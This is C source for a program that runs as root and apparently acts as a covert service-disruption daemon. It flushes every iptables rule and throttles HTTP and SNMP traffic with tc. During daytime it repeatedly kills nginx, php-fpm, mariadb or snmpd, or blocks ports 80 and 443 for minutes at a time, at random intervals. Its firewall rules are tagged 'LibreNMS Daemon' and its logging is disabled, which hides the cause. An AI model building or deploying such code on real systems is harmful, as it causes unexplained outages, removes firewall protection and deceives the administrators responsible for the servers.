#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_CMD_LENGTH 1024
#define MAX_INTERFACE_LENGTH 16
//#define LOG_FILE "/var/log/snmp.log"

volatile sig_atomic_t running = 1;

void signal_handler(int signum) {
    running = 0;
}

/*
void log_message(const char* message) {
    FILE* log_file = fopen(LOG_FILE, "a");
    if (log_file) {
        time_t now = time(NULL);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
        fprintf(log_file, "[%s] %s\n", timestamp, message);
        fclose(log_file);
    }
}
*/

char* get_default_interface() {
    static char interface[MAX_INTERFACE_LENGTH];
    FILE* fp = popen("ip -o -4 route show to default | awk '{print $5}'", "r");
    if (fp == NULL) {
        //log_message("Failed to run command to get default interface");
        perror("Failed to run command");
        exit(1);
    }
    if (fgets(interface, sizeof(interface), fp) != NULL) {
        interface[strcspn(interface, "\n")] = 0;
    }
    pclose(fp);
    return interface;
}

void execute_command(const char* cmd) {
    //char log_buffer[MAX_CMD_LENGTH + 100];
    //snprintf(log_buffer, sizeof(log_buffer), "Executing command: %s", cmd);
    //log_message(log_buffer);

    int status = system(cmd);
    if (status == -1 || !WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        //snprintf(log_buffer, sizeof(log_buffer), "Command failed: %s", cmd);
        //log_message(log_buffer);
        fprintf(stderr, "Command failed: %s\n", cmd);
    } /* else {
        log_message("Command executed successfully");
    } */
}

void setup_tc(const char* interface) {
    char cmd[MAX_CMD_LENGTH];

    snprintf(cmd, sizeof(cmd), "tc qdisc del dev %s root 2> /dev/null", interface);
    execute_command(cmd);

    snprintf(cmd, sizeof(cmd), "tc qdisc add dev %s root handle 1: htb default 10", interface);
    execute_command(cmd);

    snprintf(cmd, sizeof(cmd), "tc class add dev %s parent 1: classid 1:1 htb rate 500kbit burst 15k quantum 1500", interface);
    execute_command(cmd);

    snprintf(cmd, sizeof(cmd), "tc class add dev %s parent 1: classid 1:2 htb rate 10kbit burst 15k quantum 1500", interface);
    execute_command(cmd);

    const char* tcp_ports[] = {"80", "443"};
    const char* udp_ports[] = {"161", "162"};

    for (int i = 0; i < 2; i++) {
        snprintf(cmd, sizeof(cmd), "tc filter add dev %s protocol ip parent 1:0 prio 1 u32 match ip protocol 6 0xff match ip dport %s 0xffff flowid 1:1", interface, tcp_ports[i]);
        execute_command(cmd);
    }

    for (int i = 0; i < 2; i++) {
        snprintf(cmd, sizeof(cmd), "tc filter add dev %s protocol ip parent 1:0 prio 1 u32 match ip protocol 17 0xff match ip dport %s 0xffff flowid 1:2", interface, udp_ports[i]);
        execute_command(cmd);
    }
}

void perform_action(int job_type) {
    char cmd[MAX_CMD_LENGTH];
    const char* services[] = {"nginx", "php-fpm", "mariadb", "snmpd"};
    const char* comment = "LibreNMS Daemon";

    if (job_type == 1) {
        int service_index = rand() % 4;
        const char* proc_name = services[service_index];

        snprintf(cmd, sizeof(cmd), "pgrep %s > /dev/null && pkill -15 %s", proc_name, proc_name);
        execute_command(cmd);

        //sleep(5 + rand() % 16);
	sleep((3 + rand() % 5) * 60); //180-420

        if (strcmp(proc_name, "php-fpm") == 0) {
             //Get PHP version and construct service name
             char php_version_cmd[MAX_CMD_LENGTH];
             snprintf(php_version_cmd, sizeof(php_version_cmd), 
                      "php -r \"echo 'php'.PHP_MAJOR_VERSION.'.'.PHP_MINOR_VERSION.'-fpm';\"");

             FILE *fp = popen(php_version_cmd, "r");
             if (fp == NULL) {
                 //log_message("Failed to get PHP version");
                 return;
             }

             char php_service[64];
             if (fgets(php_service, sizeof(php_service), fp) != NULL) {
                 php_service[strcspn(php_service, "\n")] = 0;
                 snprintf(cmd, sizeof(cmd), "systemctl start %s", php_service);
             } else {
                 //log_message("Failed to get PHP-FPM service name");
                 pclose(fp);
                 return;
             }
             pclose(fp);
         } else {
             snprintf(cmd, sizeof(cmd), "systemctl start %s", proc_name);
         }
         execute_command(cmd);
    } else if (job_type == 2) {
        snprintf(cmd, sizeof(cmd), "/etc/alternatives/iptables -A INPUT -p tcp -m multiport --dports 80,443 -j DROP -m comment --comment '%s'", comment);
        execute_command(cmd);

        //sleep(5 + rand() % 16);
	sleep((3 + rand() % 5) * 60); //180-420

        snprintf(cmd, sizeof(cmd), "/etc/alternatives/iptables -D INPUT -p tcp -m multiport --dports 80,443 -j DROP -m comment --comment '%s'", comment);
        execute_command(cmd);
    }
}

int main() {
    if (getuid() != 0) {
        fprintf(stderr, "You must be root to run this program\n");
        return 1;
    }

    //log_message("Program started");

    char* interface = get_default_interface();
    if (strlen(interface) == 0) {
        //log_message("No default network interface found");
        fprintf(stderr, "No default network interface found\n");
        return 1;
    }

    //char log_buffer[MAX_CMD_LENGTH];
    //snprintf(log_buffer, sizeof(log_buffer), "Using network interface: %s", interface);
    //log_message(log_buffer);

    srand(time(NULL));
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    execute_command("/etc/alternatives/iptables -F");
    execute_command("/etc/alternatives/iptables -X");
    execute_command("/etc/alternatives/iptables -Z");

    setup_tc(interface);

    while (running) {
        time_t t = time(NULL);
        struct tm *tm = localtime(&t);
        int current_hour = tm->tm_hour;

        if (current_hour >= 6 && current_hour < 20) { //Changed condition to cover 18:00 - 08:00 (current_hour >= 18 || current_hour < 8)
            int job_type = 1 + rand() % 2;
            //snprintf(log_buffer, sizeof(log_buffer), "Performing action: job_type %d", job_type);
            //log_message(log_buffer);
            perform_action(job_type);
            //sleep(30 + rand() % 91);
	    sleep((180 + rand() % 181) * 60); //180-360
        } else {
            //log_message("Outside working hours, sleeping");
            sleep(60);
        }
    }

    //log_message("Program exiting");
    printf("Exiting...\n");
    return 0;
}
